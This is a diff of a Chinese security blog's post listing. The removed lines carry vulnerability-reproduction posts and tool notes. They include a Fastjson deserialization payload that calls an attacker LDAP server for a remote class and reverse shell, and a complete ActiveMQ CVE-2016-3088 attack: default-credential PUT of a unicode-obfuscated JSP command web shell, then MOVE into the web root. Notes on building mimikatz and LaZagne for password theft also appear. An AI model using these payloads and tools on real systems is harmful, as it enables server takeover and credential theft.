-<p>使用marshalsec工具快捷的开启LDAP服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xxx.xxx.xxx.xxx:7000/#Exploit 7500</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/marshalsec.png" alt></p>
-<p>一共开启了三个监听，最后我们发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://xxxxxx:7000/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>shell就可以弹回来了，但是一个ip只可以利用一次。</p>
-<p>还需要注意jdk的版本。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/05/28/JAVA反射学习代码/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/05/28/JAVA反射学习代码/" class="post-title-link" itemprop="url">JAVA反射学习代码</a>
-              
+<p><br></p>
+<p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123...</span></pre></td></tr></table></div></figure></p>
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-05-28 11:07:45 / 修改时间：11:09:09" itemprop="dateCreated datePublished" datetime="2020-05-28T11:07:45+08:00">2020-05-28</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>看这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null);</span><br><span class="line">        //System.out.println(runtime.getClass().getName());</span><br><span class="line">        </span><br><span class="line">    	Runtime.class.getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad.exe&quot;);</span><br><span class="line">    	</span><br><span class="line">        System.out.println(runtime.getClass());</span><br><span class="line">        </span><br><span class="line">        System.out.println(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        </span><br><span class="line">        System.out.println(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
     </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
+</div>
 
 
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/05/20/mimikatz编译/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            五月 28, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/05/28/JAVA反射学习代码/" title="JAVA反射学习代码" class="posttitle">JAVA反射学习代码</a></h3>
         
-        
-          <h1 class="post-title" itemprop="name headline">
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        2.5k
+                    </span>
                 
                 
-                <a href="/2020/05/20/mimikatz编译/" class="post-title-link" itemprop="url">mimikatz编译</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        2 mins.
+                    </span>
                 
-              
-
-              <time title="创建时间：2020-05-20 18:50:45 / 修改时间：19:08:11" itemprop="dateCreated datePublished" datetime="2020-05-20T18:50:45+08:00">2020-05-20</time>
+                
+            </p>
             
-
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/JAVA/">JAVA</a></li></ul>
             
-              
-
-              
+        
+        <div class="md-content animated fadeIn">
             
-          </span>
-
-          
-
-          
+                <p>看这个：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Object runtime...</span></pre></td></tr></table></div></figure></p>
             
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/05/28/JAVA反射学习代码/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
+    </div>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
 
-      
-      
-
-      
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            五月 20, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/05/20/mimikatz编译/" title="mimikatz编译" class="posttitle">mimikatz编译</a></h3>
         
-          
-            <p>我真的是菜死了，编译都不会妈鸭</p>
-<p>主要是vs的问题<br><img src="/2020/05/20/mimikatz编译/download.png" alt><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。</p>
-<p>编译时候设置如下：<br><img src="/2020/05/20/mimikatz编译/1.png" alt><br><img src="/2020/05/20/mimikatz编译/2.png" alt></p>
-<p>然后就可以编译了，问题不大。</p>
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        330
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        1 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>我真的是菜死了，编译都不会妈鸭</p>
+<p>主要是vs的问题<br><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。<br>编译时候设置如下：<br><br><br>然后就可以编译了，问题不大。</p>
 <p>拜</p>
 <p>写文章越来越水啦</p>
 <p>日，图片显示不出来 淦</p>
 <p>好了好了</p>
 
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/05/12/LaZagne编译抓取浏览器密码/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/05/12/LaZagne编译抓取浏览器密码/" class="post-title-link" itemprop="url">LaZagne编译抓取浏览器密码</a>
-              
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-05-12 19:33:08 / 修改时间：19:50:01" itemprop="dateCreated datePublished" datetime="2020-05-12T19:33:08+08:00">2020-05-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/05/20/mimikatz编译/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p>
-<ul>
-<li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li>
-<li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li>
-<li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></li>
-</ul>
-<h1 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h1><p>首先将LaZagne源码下载下来，然后安装我们需要的python第三方库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/install.jpg" alt></p>
-<p>安装pyinstaller：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/pyinstaller.jpg" alt></p>
-<p>利用pyinstaller编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile -w lazagne.spec</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/success.jpg" alt></p>
-<p>编译成功之后会在dist文件中生成LaZagne.exe</p>
-<p>抓取浏览器密码<br><img src="/2020/05/12/LaZagne编译抓取浏览器密码/browsers.png" alt></p>
-
-          
-        
-      
     </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/" class="post-title-link" itemprop="url">Apache ActiveMQ 远程代码执行漏洞复现</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-04-18 14:01:53 / 修改时间：14:38:56" itemprop="dateCreated datePublished" datetime="2020-04-18T14:01:53+08:00">2020-04-18</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <ul>
-<li>漏洞编号：CVE-2016-3088</li>
-<li>利用条件：需要登录在admin或者api中，默认密码为admin<br><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png" alt></li>
-</ul>
-<p>首先获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/home.png" alt></p>
-<p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Host: xxxxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=18wh2ode441ry1g7stwirxxm0v</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3052</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/content.png" alt></p>
-<p>由于在fileserver这个路径下无法解析，我们接下来要使用MOVE方式移动到web能解析的目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Destination: file:///C:/apache-activemq-5.4.3/webapps/admin/sys1.jsp</span><br><span class="line">Host: xxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1pyt7l1je0zt0oka428srh0r6</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/success.png" alt><br>注意有三个回车在最后鸭</p>
-<p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/admin.png" alt></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/03/24/应急响应基础知识和命令/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/03/24/应急响应基础知识和命令/" class="post-title-link" itemprop="url">应急响应基础知识和命令</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-03-24 17:42:22" itemprop="dateCreated datePublished" datetime="2020-03-24T17:42:22+08:00">2020-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-03-26 14:32:49" itemprop="dateModified" datetime="2020-03-26T14:32:49+08:00">2020-03-26</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p>
-<p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p>
-<p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p>
-<p>不过主要的还是勒索和挖矿两种。</p>
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>文件分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#查看tmp目录下的文件</span><br><span class="line">ls –alt /tmp/</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">#按时间排序查看指定目录下的文件</span><br><span class="line">ls -alt | head -n 10</span><br><span class="line"></span><br><span class="line">#查看文件创建修改时间信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">#查看历史命令记录文件</span><br><span class="line">cat /root/.bash_history | more</span><br><span class="line"></span><br><span class="line">#查看操作系统用户信息文件/etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#查找24小时内被修改的php文件</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">#查找72小时内新增的文件</span><br><span class="line">find / -ctime 2</span><br><span class="line"></span><br><span class="line">#查找777的权限的jsp文件</span><br><span class="line">find / *.jpg -perm 4777</span><br><span class="line"></span><br><span class="line">#查看当前的任务计划有哪些</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">#查看etc目录任务计划相关文件</span><br><span class="line">ls 